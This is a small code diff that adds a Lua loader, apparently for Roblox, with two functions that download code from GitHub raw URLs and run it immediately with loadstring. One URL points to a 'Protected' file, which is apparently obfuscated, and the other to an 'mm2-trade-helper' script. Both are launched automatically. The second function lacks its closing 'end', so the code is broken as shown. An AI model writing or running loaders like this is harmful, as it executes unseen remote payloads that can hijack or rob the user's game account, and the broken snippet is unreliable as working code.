@@ -1,1 +1,9 @@
+local function script1()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SolarHub-lua/ICEHUB/refs/heads/main/Protected_7890056850856995.txt"))()
+end
 
+local function script2()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2-trade-helper.lua",true))()
+
+task.spawn(script1)
+task.spawn(script2) 
